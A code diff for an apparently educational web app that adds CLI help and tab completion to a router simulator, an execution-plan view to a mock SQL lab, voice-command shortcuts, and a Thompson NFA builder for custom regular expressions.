@@ -1589,6 +1589,9 @@ class TopologySimulation {
             } else if (e.key === 'Tab') {
                 e.preventDefault();
                 this.handleTabCompletion(node, input);
+            } else if (e.key === '?') {
+                e.preventDefault();
+                this.showHelpCommands(node, input.value);
             } else if (e.key === 'ArrowUp') {
                 e.preventDefault();
                 if (node.historyIndex < node.commandHistory.length - 1) {
@@ -1609,15 +1612,13 @@ class TopologySimulation {
     }
 
     handleTabCompletion(node, input) {
-        const val = input.value.toLowerCase().trim();
-        const args = val.split(/\s+/);
-        const base = args[0];
+        const val = input.value.trim().toLowerCase();
         
         const commands = {
             'user': ['enable', 'ping', 'show', 'exit', 'help', 'traceroute', 'clear'],
-            'privileged': ['configure terminal', 'disable', 'ping', 'show', 'write', 'copy', 'erase', 'reload', 'clock', 'terminal', 'exit', 'traceroute', 'debug', 'undebug'],
-            'config': ['hostname', 'interface', 'ip route', 'router', 'vlan', 'banner', 'line', 'no', 'exit', 'end', 'do', 'service', 'access-list', 'ip default-gateway'],
-            'config-if': ['ip address', 'no shutdown', 'shutdown', 'switchport', 'description', 'duplex', 'speed', 'exit', 'end', 'vlan', 'channel-group'],
+            'privileged': ['configure terminal', 'disable', 'ping', 'show', 'write', 'copy', 'erase', 'reload', 'exit', 'traceroute'],
+            'config': ['hostname', 'interface', 'ip route', 'router rip', 'router ospf', 'vlan', 'no', 'exit', 'end'],
+            'config-if': ['ip address', 'no shutdown', 'shutdown', 'switchport mode trunk', 'switchport mode access', 'switchport access vlan', 'exit', 'end'],
             'config-router': ['network', 'neighbor', 'passive-interface', 'redistribute', 'exit', 'end']
         };
 
@@ -1627,8 +1628,130 @@ class TopologySimulation {
         if (matches.length === 1) {
             input.value = matches[0];
         } else if (matches.length > 1) {
-            // Logic for multiple matches could go here (e.g. show all)
+            let common = matches[0];
+            for (let i = 1; i < matches.length; i++) {
+                let j = 0;
+                while (j < common.length && j < matches[i].length && common[j] === matches[i][j]) {
+                    j++;
+                }
+                common = common.slice(0, j);
+            }
+            if (common.length > val.length) {
+                input.value = common;
+            } else {
+                const area = document.getElementById('terminalArea');
+                if (area) {
+                    const line = document.createElement('div');
+                    line.className = 'terminal-line';
+                    line.style.color = '#94a3b8';
+                    line.textContent = matches.join('   ');
+                    area.insertBefore(line, area.querySelector('.terminal-input-wrap'));
+                    area.scrollTop = area.scrollHeight;
+                }
+            }
         }
+    }
+
+    showHelpCommands(node, currentInput) {
+        const area = document.getElementById('terminalArea');
+        if (!area) return;
+
+        const val = currentInput.trim().toLowerCase();
+        const args = val.split(/\s+/);
+        let helpList = [];
+        
+        const commandsHelp = {
+            'user': [
+                { cmd: 'enable', desc: 'Turn on privileged commands' },
+                { cmd: 'ping', desc: 'Send echo messages' },
+                { cmd: 'show', desc: 'Show running system information' },
+                { cmd: 'traceroute', desc: 'Trace route to destination' },
+                { cmd: 'exit', desc: 'Exit from the CLI' },
+                { cmd: 'help', desc: 'Description of the interactive help system' }
+            ],
+            'privileged': [
+                { cmd: 'configure terminal', desc: 'Enter configuration mode' },
+                { cmd: 'disable', desc: 'Turn off privileged commands' },
+                { cmd: 'ping', desc: 'Send echo messages' },
+                { cmd: 'show', desc: 'Show running system information' },
+                { cmd: 'write', desc: 'Write configuration to NVRAM (save)' },
+                { cmd: 'erase', desc: 'Erase NVRAM configuration' },
+                { cmd: 'reload', desc: 'Halt and perform a cold restart' },
+                { cmd: 'exit', desc: 'Exit from the CLI' }
+            ],
+            'config': [
+                { cmd: 'hostname', desc: 'Set system\'s network name' },
+                { cmd: 'interface', desc: 'Select an interface to configure' },
+                { cmd: 'ip route', desc: 'Establish static routes' },
+                { cmd: 'router', desc: 'Enable routing process' },
+                { cmd: 'vlan', desc: 'Configure Virtual LAN parameters' },
+                { cmd: 'no', desc: 'Negate a command or set its defaults' },
+                { cmd: 'exit', desc: 'Exit from configuration mode' },
+                { cmd: 'end', desc: 'Exit to privileged EXEC mode' }
+            ],
+            'config-if': [
+                { cmd: 'ip address', desc: 'Set IP address and subnet mask' },
+                { cmd: 'no shutdown', desc: 'Enable interface operation (link up)' },
+                { cmd: 'shutdown', desc: 'Disable interface operation' },
+                { cmd: 'switchport mode', desc: 'Configure switchport trunk/access mode' },
+                { cmd: 'switchport access vlan', desc: 'Assign port to a VLAN' },
+                { cmd: 'exit', desc: 'Exit from interface configuration mode' },
+                { cmd: 'end', desc: 'Exit to privileged EXEC mode' }
+            ],
+            'config-router': [
+                { cmd: 'network', desc: 'Enable routing on an IP network' },
+                { cmd: 'neighbor', desc: 'Suppress routing updates on an interface' },
+                { cmd: 'redistribute', desc: 'Redistribute routing information' },
+                { cmd: 'exit', desc: 'Exit from router configuration mode' },
+                { cmd: 'end', desc: 'Exit to privileged EXEC mode' }
+            ]
+        };
+
+        const currentPool = commandsHelp[node.cliMode] || [];
+
+        if (args.length === 1 && args[0] === '') {
+            helpList = currentPool;
+        } else if (args.length === 1) {
+            const prefix = args[0];
+            helpList = currentPool.filter(c => c.cmd.startsWith(prefix));
+        } else if (args[0] === 'show') {
+            helpList = [
+                { cmd: 'running-config', desc: 'Show active configuration parameters' },
+                { cmd: 'ip route', desc: 'Show IP routing table' },
+                { cmd: 'ip interface brief', desc: 'Show brief summary of interface status' },
+                { cmd: 'vlan', desc: 'Show VLAN parameters' }
+            ];
+        } else if (args[0] === 'interface' && node.cliMode === 'config') {
+            helpList = [
+                { cmd: 'fa0/0', desc: 'FastEthernet interface 0/0' },
+                { cmd: 'fa0/1', desc: 'FastEthernet interface 0/1' }
+            ];
+        } else if (args[0] === 'router' && node.cliMode === 'config') {
+            helpList = [
+                { cmd: 'rip', desc: 'Routing Information Protocol (RIP)' },
+                { cmd: 'ospf', desc: 'Open Shortest Path First (OSPF)' }
+            ];
+        } else {
+            helpList = [{ cmd: '<cr>', desc: 'Press Enter to execute command' }];
+        }
+
+        const cmdLine = document.createElement('div');
+        cmdLine.className = 'terminal-line';
+        cmdLine.style.fontWeight = 'bold';
+        cmdLine.textContent = `${document.getElementById('prompt').textContent}${currentInput}?`;
+        area.insertBefore(cmdLine, area.querySelector('.terminal-input-wrap'));
+
+        helpList.forEach(item => {
+            const line = document.createElement('div');
+            line.className = 'terminal-line';
+            line.style.color = '#a3a3a3';
+            line.style.display = 'flex';
+            line.style.justifyContent = 'space-between';
+            line.innerHTML = `<span style="color:#fbbf24; font-family:monospace; min-width:180px; display:inline-block;">${item.cmd}</span><span>${item.desc}</span>`;
+            area.insertBefore(line, area.querySelector('.terminal-input-wrap'));
+        });
+
+        area.scrollTop = area.scrollHeight;
     }
 
     processCommand(node, cmd) {
@@ -4460,10 +4583,22 @@ const initSqlLab = async (container, labId) => {
                 </div>
                 
                 <div style="flex:1.2; display:flex; flex-direction:column; border:1px solid var(--border); border-radius:12px; overflow:hidden; min-width:320px; background:var(--bg-page);">
-                    <div style="background:var(--bg-alt); padding:8px 16px; border-bottom:1px solid var(--border); font-weight:700;">📊 Query Output Console</div>
-                    <div id="sql-console-output" style="flex:1; padding:16px; overflow-y:auto; font-family:'JetBrains Mono', monospace; font-size:13px;">
-                        SQL engine ready. Write queries and click 'Run Query'.<br>
-                        Example: <code>SELECT * FROM Students;</code>
+                    <div style="background:var(--bg-alt); padding:8px 16px; border-bottom:1px solid var(--border); font-weight:700; display:flex; justify-content:space-between; align-items:center;">
+                        <div style="display:flex; gap:12px; font-size:13px;">
+                            <span id="tabSqlOutput" style="cursor:pointer; font-weight:700; border-bottom:2px solid var(--primary); padding-bottom:2px; color:var(--text-main);">💻 Query Output</span>
+                            <span id="tabSqlPlan" style="cursor:pointer; font-weight:700; color:var(--text-muted); padding-bottom:2px;">📊 Execution Plan</span>
+                        </div>
+                    </div>
+                    <div id="sql-tab-content" style="flex:1; display:flex; flex-direction:column; position:relative; overflow:hidden; min-height:150px;">
+                        <div id="sql-console-output" style="flex:1; padding:16px; overflow-y:auto; font-family:'JetBrains Mono', monospace; font-size:13px;">
+                            SQL engine ready. Write queries and click 'Run Query'.<br>
+                            Example: <code>SELECT * FROM Students;</code>
+                        </div>
+                        <div id="sql-plan-output" style="display:none; flex:1; padding:16px; overflow-y:auto; font-family:inherit; font-size:13px; height:100%; background:var(--bg-page);">
+                            <div style="text-align:center; padding:30px; color:var(--text-muted);">
+                                Run a SELECT query to view its query execution plan parser tree.
+                            </div>
+                        </div>
                     </div>
                 </div>
             </div>
@@ -4478,6 +4613,95 @@ const initSqlLab = async (container, labId) => {
 
     sqlEditor.setValue(`-- Write SQL queries here and run against mock DB\nSELECT * FROM Students;`, -1);
 
+    const generateSQLPlan = (sql) => {
+        const query = sql.trim().replace(/\s+/g, ' ').toLowerCase();
+        const fromMatch = query.match(/\bfrom\s+(\w+)/);
+        const tableName = fromMatch ? fromMatch[1] : 'students';
+        const selectMatch = query.match(/\bselect\s+(.+?)\s+from\b/);
+        const columnsStr = selectMatch ? selectMatch[1].trim() : '*';
+        const whereMatch = query.match(/\bwhere\s+(.+?)(?:\s+order\s+by|\s+group\s+by|;|$)/);
+        const filterCond = whereMatch ? whereMatch[1].trim() : null;
+        const hasJoin = query.includes('join');
+        const joinTable = hasJoin ? query.match(/\bjoin\s+(\w+)\b/)?.[1] : null;
+
+        let steps = [];
+        if (hasJoin) {
+            steps.push({ name: 'Table Scan', details: `Scan Table: ${tableName.toUpperCase()}`, rows: 4 });
+            steps.push({ name: 'Table Scan', details: `Scan Table: ${joinTable.toUpperCase()}`, rows: 3 });
+            steps.push({ name: 'Hash Join', details: `Join Condition keys`, rows: 3 });
+        } else {
+            steps.push({ name: 'Table Scan', details: `Scan Table: ${tableName.toUpperCase()}`, rows: 4 });
+        }
+
+        if (filterCond) {
+            steps.push({ name: 'Filter', details: `Filter: ${filterCond.toUpperCase()}`, rows: 2 });
+        }
+
+        steps.push({ name: 'Projection', details: `Project: ${columnsStr.toUpperCase()}`, rows: 2 });
+        return steps;
+    };
+
+    const renderSQLPlanSVG = (steps) => {
+        let svgHtml = '';
+        const nodeWidth = 220;
+        const nodeHeight = 55;
+        const levelHeight = 90;
+        const svgWidth = 300;
+        const svgHeight = steps.length * levelHeight;
+        let x = svgWidth / 2;
+        
+        steps.forEach((step, idx) => {
+            const y = 20 + idx * levelHeight;
+            if (idx > 0) {
+                svgHtml += `
+                    <line x1="${x}" y1="${y - levelHeight + nodeHeight}" x2="${x}" y2="${y}" stroke="var(--primary)" stroke-width="2" marker-end="url(#arrow)" />
+                    <text x="${x + 10}" y="${y - levelHeight/2 + 5}" fill="var(--text-muted)" font-family="monospace" font-size="11">${step.rows} rows</text>
+                `;
+            }
+            svgHtml += `
+                <rect x="${x - nodeWidth/2}" y="${y}" width="${nodeWidth}" height="${nodeHeight}" rx="8" ry="8" fill="var(--bg-alt)" stroke="var(--primary)" stroke-width="1.5" />
+                <text x="${x}" y="${y + 22}" fill="var(--primary)" font-family="'Outfit', sans-serif" font-weight="bold" font-size="13" text-anchor="middle">${step.name}</text>
+                <text x="${x}" y="${y + 40}" fill="var(--text-muted)" font-family="monospace" font-size="10" text-anchor="middle">${step.details.length > 30 ? step.details.substring(0,27) + '...' : step.details}</text>
+            `;
+        });
+        
+        return `
+            <svg width="100%" height="${svgHeight}px" viewBox="0 0 ${svgWidth} ${svgHeight}">
+                <defs>
+                    <marker id="arrow" viewBox="0 0 10 10" refX="6" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                        <path d="M 0 1 L 10 5 L 0 9 z" fill="var(--primary)" />
+                    </marker>
+                </defs>
+                ${svgHtml}
+            </svg>
+        `;
+    };
+
+    const tabOutput = document.getElementById('tabSqlOutput');
+    const tabPlan = document.getElementById('tabSqlPlan');
+    const outBox = document.getElementById('sql-console-output');
+    const planBox = document.getElementById('sql-plan-output');
+
+    if (tabOutput && tabPlan && outBox && planBox) {
+        tabOutput.onclick = () => {
+            tabOutput.style.borderBottom = '2px solid var(--primary)';
+            tabOutput.style.color = 'var(--text-main)';
+            tabPlan.style.borderBottom = 'none';
+            tabPlan.style.color = 'var(--text-muted)';
+            outBox.style.display = 'block';
+            planBox.style.display = 'none';
+        };
+
+        tabPlan.onclick = () => {
+            tabPlan.style.borderBottom = '2px solid var(--primary)';
+            tabPlan.style.color = 'var(--text-main)';
+            tabOutput.style.borderBottom = 'none';
+            tabOutput.style.color = 'var(--text-muted)';
+            planBox.style.display = 'block';
+            outBox.style.display = 'none';
+        };
+    }
+
     document.getElementById('btnRunSql').addEventListener('click', () => {
         const text = sqlEditor.getValue();
         const out = document.getElementById('sql-console-output');
@@ -4485,7 +4709,6 @@ const initSqlLab = async (container, labId) => {
         const res = executeSQL(text);
         if (res.success) {
             if (res.rows && res.rows.length !== undefined) {
-                // Table output rendering
                 let tableHtml = `<table style="width:100%; border-collapse:collapse; margin-top:8px; font-size:13px; text-align:left;"><thead><tr style="border-bottom:2px solid var(--border); background:var(--bg-alt);">`;
                 res.columns.forEach(col => {
                     tableHtml += `<th style="padding:8px;">${col.toUpperCase()}</th>`;
@@ -4500,23 +4723,33 @@ const initSqlLab = async (container, labId) => {
                 });
                 tableHtml += `</tbody></table>`;
                 out.innerHTML = `Query successful. Selected ${res.rows.length} rows.\n` + tableHtml;
+
+                const steps = generateSQLPlan(text);
+                const svgHtml = renderSQLPlanSVG(steps);
+                planBox.innerHTML = `
+                    <h4 style="margin:0 0 -12px 0; color:var(--primary);">Parsed Query Plan Graph</h4>
+                    <div style="background:var(--bg-alt); padding:16px; border-radius:12px; border:1px solid var(--border); display:flex; justify-content:center; align-items:center; margin-top:10px;">
+                        ${svgHtml}
+                    </div>
+                `;
             } else {
                 out.innerHTML = `<span style="color:#10b981;">Query executed successfully. ${res.message || ''}</span>`;
+                planBox.innerHTML = `<div style="text-align:center; padding:30px; color:var(--text-muted);">Query does not return tabular rows (no scan plan needed).</div>`;
             }
             
-            // Mark lab complete
             syncProgress(labId, { score: 100, completed: true });
             const scoreDisp = document.getElementById('scoreDisplay');
             if (scoreDisp) scoreDisp.textContent = `Score: 100`;
             localStorage.setItem(`vlab_state_${labId}`, JSON.stringify({ score: 100, completed: true }));
         } else {
             out.innerHTML = `<span style="color:#ef4444; font-weight:bold;">${res.error}</span>`;
+            planBox.innerHTML = `<div style="text-align:center; padding:30px; color:var(--danger);">Error compiling SQL: cannot generate execution plan.</div>`;
         }
     });
 
     document.getElementById('btnResetSql').addEventListener('click', () => {
         MOCK_DB_WORKING = JSON.parse(JSON.stringify(MOCK_DB));
-        alert(" Relational tables reset to initial database records.");
+        alert("Relational tables reset to initial database records.");
     });
 };
 
@@ -4758,6 +4991,119 @@ document.addEventListener('DOMContentLoaded', async () => {
 
     // Initial State Restoration from Cloud
     await fetchProgress();
+
+    const initVoiceCommandController = () => {
+        const btnVoice = document.getElementById('btnVoiceCommand');
+        if (!btnVoice) return;
+
+        let recognition = null;
+        let isListening = false;
+
+        const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
+        if (!SpeechRecognition) {
+            btnVoice.style.display = 'none';
+            return;
+        }
+
+        recognition = new SpeechRecognition();
+        recognition.continuous = true;
+        recognition.lang = 'en-US';
+        recognition.interimResults = false;
+
+        recognition.onresult = (event) => {
+            const resultIndex = event.resultIndex;
+            const transcript = event.results[resultIndex][0].transcript.toLowerCase().trim();
+            console.log("Voice Command Detected:", transcript);
+            
+            if (transcript.includes('run code') || transcript.includes('execute')) {
+                const runBtn = document.getElementById('btnRunCode') || document.getElementById('btnRunSql');
+                if (runBtn) {
+                    runBtn.click();
+                    showVoiceHint("Action: Running Code");
+                }
+            } else if (transcript.includes('static audit') || transcript.includes('check quality') || transcript.includes('audit code')) {
+                const auditBtn = document.getElementById('btnCheckQuality') || document.getElementById('btnAiAudit');
+                if (auditBtn) {
+                    auditBtn.click();
+                    showVoiceHint("Action: Code Audit");
+                }
+            } else if (transcript.includes('toggle 3d') || transcript.includes('view 3d')) {
+                const toggle3D = document.getElementById('btnToggle3D');
+                if (toggle3D) {
+                    toggle3D.click();
+                    showVoiceHint("Action: Toggle 3D Mode");
+                }
+            } else if (transcript.includes('toggle theme') || transcript.includes('switch theme')) {
+                const toggleTheme = document.getElementById('themeToggle');
+                if (toggleTheme) {
+                    toggleTheme.click();
+                    showVoiceHint("Action: Toggle Theme");
+                }
+            } else if (transcript.includes('reset code')) {
+                const resetBtn = document.getElementById('btnResetCode');
+                if (resetBtn) {
+                    resetBtn.click();
+                    showVoiceHint("Action: Resetting Code");
+                }
+            } else if (transcript.includes('open tutor') || transcript.includes('ai tutor')) {
+                const bubble = document.getElementById('global-ai-bubble');
+                if (bubble) {
+                    bubble.click();
+                    showVoiceHint("Action: Open AI Tutor");
+                }
+            }
+        };
+
+        const showVoiceHint = (msg) => {
+            const hint = document.createElement('div');
+            hint.style.position = 'fixed';
+            hint.style.bottom = '90px';
+            hint.style.right = '24px';
+            hint.style.background = '#8b5cf6';
+            hint.style.color = 'white';
+            hint.style.padding = '8px 16px';
+            hint.style.borderRadius = '8px';
+            hint.style.fontSize = '12px';
+            hint.style.fontWeight = 'bold';
+            hint.style.zIndex = '99999';
+            hint.style.boxShadow = '0 4px 15px rgba(139, 92, 246, 0.4)';
+            hint.style.pointerEvents = 'none';
+            hint.textContent = msg;
+            document.body.appendChild(hint);
+            setTimeout(() => {
+                hint.style.opacity = '0';
+                hint.style.transition = 'opacity 0.5s';
+                setTimeout(() => hint.remove(), 500);
+            }, 2000);
+        };
+
+        recognition.onend = () => {
+            if (isListening) {
+                try { recognition.start(); } catch(e){}
+            }
+        };
+
+        btnVoice.onclick = () => {
+            isListening = !isListening;
+            if (isListening) {
+                btnVoice.style.background = '#ef4444';
+                btnVoice.style.color = 'white';
+                btnVoice.title = "Stop Listening";
+                try {
+                    recognition.start();
+                    showVoiceHint("Voice Command Listening...");
+                } catch(e){}
+            } else {
+                btnVoice.style.background = '';
+                btnVoice.style.color = '';
+                btnVoice.title = "Voice Command Controller";
+                recognition.stop();
+                showVoiceHint("Voice Command Stopped");
+            }
+        };
+    };
+
+    initVoiceCommandController();
 
     let currentScore = 0;
     window.currentSim = null;
@@ -8688,29 +9034,34 @@ document.addEventListener('DOMContentLoaded', async () => {
                     <div class="theory-card" style="margin:0; padding:20px; display:flex; flex-direction:column; gap:15px;">
                         <h3 style="color:var(--primary); margin:0;">Regex Configuration</h3>
                         <div>
-                            <label style="display:block; font-size:12px; font-weight:800; margin-bottom:5px; color:var(--text-muted);">Select Regular Expression:</label>
+                            <label style="display:block; font-size:12px; font-weight:800; margin-bottom:5px; color:var(--text-muted);">Expression Templates:</label>
                             <select id="regexChoice" class="sim-select" style="width:100%;">
                                 <option value="union">a | b (Alternation)</option>
                                 <option value="star">a* (Kleene Star)</option>
                                 <option value="concat">a · b (Concatenation)</option>
                                 <option value="star_concat">a* · b (Combination)</option>
+                                <option value="custom">-- Custom Free-Form Regex --</option>
                             </select>
+                        </div>
+                        <div id="custom-regex-wrap" style="display:none; flex-direction:column; gap:4px;">
+                            <label style="display:block; font-size:12px; font-weight:800; color:var(--text-muted);">Enter Infix Regex:</label>
+                            <input type="text" id="customRegexInput" value="(a|b)*abb" style="padding:6px; background:var(--bg-page); color:var(--text-main); border:1px solid var(--border); border-radius:6px; font-family:monospace; width:100%; box-sizing:border-box;">
                         </div>
                         <div style="display:flex; gap:10px;">
                             <button id="btnRegexReset" class="btn-sim" style="flex:1;">Reset</button>
-                            <button id="btnRegexStep" class="btn-sim primary" style="flex:1;">Step Graph</button>
+                            <button id="btnRegexStep" class="btn-sim primary" style="flex:1;">Step / Build NFA</button>
                         </div>
-                        <div style="font-family:monospace; font-size:12px; height:140px; overflow-y:auto; background:#0b0f19; padding:10px; border-radius:8px;" id="regexTraceLog">
-                            <div style="color:#64748b;">[System] Select expression and click Step Graph.</div>
+                        <div style="font-family:monospace; font-size:12px; height:120px; overflow-y:auto; background:#0b0f19; padding:10px; border-radius:8px;" id="regexTraceLog">
+                            <div style="color:#64748b;">[System] Select expression and click Build NFA.</div>
                         </div>
                     </div>
                     
                     <div class="theory-card" style="margin:0; padding:20px; display:flex; flex-direction:column; justify-content:center; align-items:center; min-height:300px;">
-                        <h3 style="color:var(--primary); margin-bottom:20px; align-self:flex-start;">Thompson e-NFA Graph Visualization</h3>
-                        <svg id="regexSvg" width="100%" height="220" viewBox="0 0 500 220" style="background:#0e1320; border-radius:12px; border:1px solid rgba(255,255,255,0.05);">
+                        <h3 style="color:var(--primary); margin-bottom:12px; align-self:flex-start;">Thompson e-NFA Graph Visualization</h3>
+                        <svg id="regexSvg" width="100%" height="240" viewBox="0 0 500 240" style="background:#0e1320; border-radius:12px; border:1px solid rgba(255,255,255,0.05);">
                             <defs>
-                                <marker id="arrow" viewBox="0 0 10 10" refX="6" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
-                                    <path d="M 0 1 L 10 5 L 0 9 z" fill="#64748b" />
+                                <marker id="arrow" viewBox="0 0 10 10" refX="16" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                                    <path d="M 0 1 L 10 5 L 0 9 z" fill="var(--primary)" />
                                 </marker>
                             </defs>
                         </svg>
@@ -8724,6 +9075,7 @@ document.addEventListener('DOMContentLoaded', async () => {
 
         const addLog = (msg, color = '#fff') => {
             const log = document.getElementById('regexTraceLog');
+            if (!log) return;
             const div = document.createElement('div');
             div.style.color = color;
             div.style.marginBottom = '5px';
@@ -8732,11 +9084,205 @@ document.addEventListener('DOMContentLoaded', async () => {
             log.scrollTop = log.scrollHeight;
         };
 
-        const renderGraph = () => {
+        const regexToPostfix = (exp) => {
+            let formatted = "";
+            for (let i = 0; i < exp.length; i++) {
+                let c = exp[i];
+                formatted += c;
+                if (i < exp.length - 1) {
+                    let next = exp[i+1];
+                    const isLiteral = (x) => /[a-z0-9]/.test(x) || x === ')';
+                    const isNextLiteral = (x) => /[a-z0-9]/.test(x) || x === '(';
+                    if (isLiteral(c) && isNextLiteral(next)) {
+                        formatted += '.';
+                    } else if (c === '*' && isNextLiteral(next)) {
+                        formatted += '.';
+                    }
+                }
+            }
+            let output = "";
+            let operators = [];
+            const precedence = { '*': 3, '.': 2, '|': 1 };
+            for (let i = 0; i < formatted.length; i++) {
+                let c = formatted[i];
+                if (/[a-z0-9]/.test(c)) {
+                    output += c;
+                } else if (c === '(') {
+                    operators.push(c);
+                } else if (c === ')') {
+                    while (operators.length > 0 && operators[operators.length - 1] !== '(') {
+                        output += operators.pop();
+                    }
+                    operators.pop();
+                } else {
+                    while (operators.length > 0 && precedence[operators[operators.length - 1]] >= precedence[c]) {
+                        output += operators.pop();
+                    }
+                    operators.push(c);
+                }
+            }
+            while (operators.length > 0) {
+                output += operators.pop();
+            }
+            return output;
+        };
+
+        const buildThompsonNFA = (postfix) => {
+            let stateCounter = 0;
+            const nextState = () => stateCounter++;
+            let stack = [];
+            
+            for (let i = 0; i < postfix.length; i++) {
+                let c = postfix[i];
+                if (/[a-z0-9]/.test(c)) {
+                    let s0 = nextState();
+                    let s1 = nextState();
+                    stack.push({ start: s0, accept: s1, transitions: [{ from: s0, to: s1, label: c }] });
+                } else if (c === '*') {
+                    if (stack.length === 0) continue;
+                    let frag = stack.pop();
+                    let s0 = nextState();
+                    let s1 = nextState();
+                    let transitions = [
+                        { from: s0, to: frag.start, label: 'ε' },
+                        { from: s0, to: s1, label: 'ε' },
+                        { from: frag.accept, to: frag.start, label: 'ε' },
+                        { from: frag.accept, to: s1, label: 'ε' },
+                        ...frag.transitions
+                    ];
+                    stack.push({ start: s0, accept: s1, transitions });
+                } else if (c === '.') {
+                    if (stack.length < 2) continue;
+                    let frag2 = stack.pop();
+                    let frag1 = stack.pop();
+                    let transitions = [
+                        { from: frag1.accept, to: frag2.start, label: 'ε' },
+                        ...frag1.transitions,
+                        ...frag2.transitions
+                    ];
+                    stack.push({ start: frag1.start, accept: frag2.accept, transitions });
+                } else if (c === '|') {
+                    if (stack.length < 2) continue;
+                    let frag2 = stack.pop();
+                    let frag1 = stack.pop();
+                    let s0 = nextState();
+                    let s1 = nextState();
+                    let transitions = [
+                        { from: s0, to: frag1.start, label: 'ε' },
+                        { from: s0, to: frag2.start, label: 'ε' },
+                        { from: frag1.accept, to: s1, label: 'ε' },
+                        { from: frag2.accept, to: s1, label: 'ε' },
+                        ...frag1.transitions,
+                        ...frag2.transitions
+                    ];
+                    stack.push({ start: s0, accept: s1, transitions });
+                }
+            }
+            return stack.pop();
+        };
+
+        const generateNFALayout = (nfa) => {
+            if (!nfa) return {};
+            let statesSet = new Set();
+            nfa.transitions.forEach(t => {
+                statesSet.add(t.from);
+                statesSet.add(t.to);
+            });
+            let states = Array.from(statesSet).sort((a,b) => a - b);
+            let distances = {};
+            states.forEach(s => distances[s] = 999);
+            distances[nfa.start] = 0;
+            
+            for (let k = 0; k < states.length; k++) {
+                nfa.transitions.forEach(t => {
+                    if (distances[t.from] !== 999 && distances[t.from] + 1 < distances[t.to]) {
+                        distances[t.to] = distances[t.from] + 1;
+                    }
+                });
+            }
+            
+            let levelGroups = {};
+            states.forEach(s => {
+                let dist = distances[s];
+                if (dist === 999) dist = states.indexOf(s);
+                if (!levelGroups[dist]) levelGroups[dist] = [];
+                levelGroups[dist].push(s);
+            });
+            
+            let layout = {};
+            const maxDistance = Math.max(...Object.keys(levelGroups).map(Number));
+            const width = 460;
+            const height = 200;
+            
+            Object.keys(levelGroups).forEach(levelKey => {
+                let level = Number(levelKey);
+                let grp = levelGroups[level];
+                let x = 40 + (level / (maxDistance || 1)) * (width - 80);
+                
+                grp.forEach((stateId, idx) => {
+                    let y = height / 2;
+                    if (grp.length > 1) {
+                        y = 35 + (idx / (grp.length - 1)) * (height - 70);
+                    }
+                    layout[stateId] = { x, y };
+                });
+            });
+            return layout;
+        };
+
+        const renderDynamicNFA = (nfa, layout) => {
             const svg = document.getElementById('regexSvg');
+            if (!svg || !nfa) return;
             svg.innerHTML = `
                 <defs>
-                    <marker id="arrow" viewBox="0 0 10 10" refX="6" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                    <marker id="arrow" viewBox="0 0 10 10" refX="16" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                        <path d="M 0 1 L 10 5 L 0 9 z" fill="var(--primary)" />
+                    </marker>
+                </defs>
+            `;
+            
+            nfa.transitions.forEach(t => {
+                const fromPos = layout[t.from];
+                const toPos = layout[t.to];
+                if (!fromPos || !toPos) return;
+                const isBackwards = fromPos.x >= toPos.x;
+                let dPath = "";
+                
+                if (isBackwards) {
+                    dPath = `M ${fromPos.x},${fromPos.y} C ${fromPos.x},${fromPos.y - 45} ${toPos.x},${toPos.y - 45} ${toPos.x},${toPos.y}`;
+                } else if (Math.abs(fromPos.y - toPos.y) > 10) {
+                    const mx = (fromPos.x + toPos.x) / 2;
+                    const my = (fromPos.y + toPos.y) / 2 + (fromPos.y > toPos.y ? -15 : 15);
+                    dPath = `M ${fromPos.x},${fromPos.y} Q ${mx},${my} ${toPos.x},${toPos.y}`;
+                } else {
+                    dPath = `M ${fromPos.x},${fromPos.y} L ${toPos.x},${toPos.y}`;
+                }
+                
+                svg.innerHTML += `
+                    <path d="${dPath}" stroke="${t.label === 'ε' ? '#64748b' : 'var(--primary)'}" stroke-width="1.5" stroke-dasharray="${t.label === 'ε' ? '4,4' : 'none'}" fill="none" marker-end="url(#arrow)" />
+                    <text x="${(fromPos.x + toPos.x)/2}" y="${(fromPos.y + toPos.y)/2 - 8}" fill="${t.label === 'ε' ? '#94a3b8' : 'var(--primary)'}" font-family="monospace" font-size="10" text-anchor="middle" font-weight="bold">${t.label}</text>
+                `;
+            });
+            
+            Object.keys(layout).forEach(stateId => {
+                const pos = layout[stateId];
+                const isStart = Number(stateId) === nfa.start;
+                const isAccept = Number(stateId) === nfa.accept;
+                
+                svg.innerHTML += `
+                    <circle cx="${pos.x}" cy="${pos.y}" r="14" fill="${isStart ? 'rgba(13,148,136,0.15)' : '#1e293b'}" stroke="${isAccept || isStart ? 'var(--primary)' : '#475569'}" stroke-width="2" />
+                    ${isAccept ? `<circle cx="${pos.x}" cy="${pos.y}" r="11" fill="none" stroke="var(--primary)" stroke-width="1" />` : ''}
+                    <text x="${pos.x}" y="${pos.y + 4}" fill="#fff" font-size="9" text-anchor="middle" font-family="monospace">q${stateId}</text>
+                `;
+            });
+        };
+
+        const renderGraph = () => {
+            const svg = document.getElementById('regexSvg');
+            if (!svg) return;
+            svg.innerHTML = `
+                <defs>
+                    <marker id="arrow" viewBox="0 0 10 10" refX="16" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
                         <path d="M 0 1 L 10 5 L 0 9 z" fill="#64748b" />
                     </marker>
                 </defs>
@@ -8772,16 +9318,16 @@ document.addEventListener('DOMContentLoaded', async () => {
                         <circle cx="350" cy="110" r="12" fill="none" stroke="var(--primary)" stroke-width="1"/>
                         <text x="350" y="114" fill="#fff" font-size="11" text-anchor="middle">q5</text>
                         
-                        <path d="M 64,100 L 136,76" stroke="#64748b" stroke-width="1.5" stroke-dasharray="4,4" marker-end="url(#arrow)"/>
+                        <path d="M 66,106 L 134,76" stroke="#64748b" stroke-width="1.5" stroke-dasharray="4,4" marker-end="url(#arrow)"/>
                         <text x="95" y="80" fill="#94a3b8" font-size="10">ε</text>
                         
-                        <path d="M 64,120 L 136,144" stroke="#64748b" stroke-width="1.5" stroke-dasharray="4,4" marker-end="url(#arrow)"/>
+                        <path d="M 66,114 L 134,144" stroke="#64748b" stroke-width="1.5" stroke-dasharray="4,4" marker-end="url(#arrow)"/>
                         <text x="95" y="144" fill="#94a3b8" font-size="10">ε</text>
                         
